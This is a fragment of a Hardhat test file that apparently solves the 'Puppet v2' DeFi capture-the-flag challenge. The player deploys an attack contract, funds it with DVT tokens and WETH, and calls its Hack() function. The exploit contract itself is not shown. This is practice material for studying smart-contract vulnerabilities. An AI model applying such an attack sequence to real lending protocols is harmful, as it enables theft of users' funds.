...
describe("[Challenge] Puppet v2", function () {
  ...
  it("Execution", async function () {
    ...
    const PuppetHackingV2Factory = await ethers.getContractFactory(
      "PuppetHackV2",
      player
    );

    const PuppetHacking = await PuppetHackingV2Factory.deploy(
    ...
    console.log("swap all ETH to DVT and send to Hackcontract");
    token
      .connect(player)
      .transfer(PuppetHacking.address, PLAYER_INITIAL_TOKEN_BALANCE);

    //   mint WETH
    const convertWETH = ethers.utils.parseEther("19.9");
    await weth.connect(player).deposit({ value: convertWETH });
    await weth.connect(player).transfer(PuppetHacking.address, convertWETH);

    // HACK
    await PuppetHacking.Hack();
  });
